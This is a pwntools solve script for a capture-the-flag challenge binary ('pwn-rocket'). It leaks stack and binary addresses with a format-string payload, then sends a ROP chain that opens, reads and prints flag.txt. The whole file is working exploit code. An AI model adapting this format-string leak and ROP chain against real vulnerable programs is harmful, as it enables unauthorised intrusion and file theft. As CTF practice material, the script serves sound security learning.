#!/usr/bin/env python3
from pwn import *
import monkeyhex
import time
import argparse
import re
from functools import partial
import logging

# Run with ipython3 -i solve.py -- DEBUG <one_gadget>

parser = argparse.ArgumentParser()
parser.add_argument("one_gadget", type=partial(int, base=0), nargs=argparse.REMAINDER)
argparse_args = parser.parse_args()

# context.log_level = 'debug'
context.terminal = ['gnome-terminal', '-e']

# default libc path for some dists is /usr/lib/libc.so.6
# lib = ELF('/lib/x86_64-linux-gnu/libc.so.6') if not args.REMOTE else ELF('libc.so.6')
# lib.sym['binsh'] = lib.offset_to_vaddr(lib.data.find(b'/bin/sh'))
# lib.sym['one_gadget'] = argparse_args.one_gadget[0] if argparse_args.one_gadget else 0
binary = context.binary = ELF('pwn-rocket')

def attach_gdb(p, commands=None):
    """Template to run gdb with predefined commands on a process."""
    val = """
    c
    """ if commands is None else commands
    res = gdb.attach(p, val)
    pause()
    return res


def new_proc(start_gdb=False, val=None):
    """Start a new process with predefined debug operations"""
    env = dict()
    # env['LD_LIBRARY_PATH'] = os.getcwd()
    # patchelf --set-interpreter "$(ls ld-*.so)" starwars_galaxies2
    # ln -s libc-*.so libc.so.6
    p = process(binary.path, env=env)
    if start_gdb is True:
        attach_gdb(p, val)
    return p

def bnot(n, numbits=context.bits):
    return (1 << numbits) -1 -n

def align(val, align_to):
    return val & bnot(align_to - 1)

def align_up(val, align_to):
    aligned = align(binend, align_to)
    if aligned < val:
        aligned += align_to
    return aligned

def batch(it, sz):
    length = len(it)
    for i in range(0, length, sz):
        yield it[i:i+sz]

p = new_proc(context.log_level == logging.DEBUG) if not args.REMOTE else remote('0.cloud.chals.io', 13163)

# do leak / payload gen here

payload = b''
formatstring = b'%p'*16
p.sendlineafter(b'>>\n', formatstring)
a = p.readuntil(b'\n')
a = a.split(b': ')[1]
leaks = [int(i, 16) for i in a.replace(b'(nil)', b'0x0').split(b'0x') if i != b'']

leak_offset = 0x10e0
bin_leak = [i for i in leaks if ((i-leak_offset) & 0xfff) == 0][0]
binary.address = bin_leak - leak_offset
stack_leak = leaks[0]

r = ROP(binary)

def getgadg(r, insns):
    return [k for k, v in r.gadgets.items() if v.insns == insns][0]

buf_addr = stack_leak+1000

pop_rdx = getgadg(r, ['pop rdx', 'ret'])
pop_rsi_r15 = getgadg(r, ['pop rsi', 'pop r15', 'ret'])
pop_rdi = getgadg(r, ['pop rdi', 'ret'])
pop_rax = getgadg(r, ['pop rax', 'ret'])
syscall = getgadg(r, ['syscall', 'ret'])
junk_val = 0x4141414141414141
filename = b'flag\x00'
binsh = b'/bin/sh\x00'



open_read_puts = [
    pop_rsi_r15,
    constants.O_RDONLY,
    junk_val,
    pop_rdi,
    binary.offset_to_vaddr(binary.data.find(b'flag.txt\x00')),
    pop_rax,
    constants.SYS_open,
    syscall,

    pop_rdx,
    64,
    pop_rsi_r15,
    buf_addr,
    junk_val,
    pop_rdi,
    3,
    pop_rax,
    constants.SYS_read,
    syscall,

    pop_rdi,
    buf_addr,
    binary.sym['puts'],

    binary.sym['main']

                    ]


payload += flat({0x48: open_read_puts })

p.sendline(payload)
time.sleep(1)
recvd = p.read()
if p.can_recv():
    recvd += p.read()

# p.send(binsh)
# recvd = p.read()
print(recvd)


# p.send(cyclic(0x200) + b'\n')
# p.interactive()
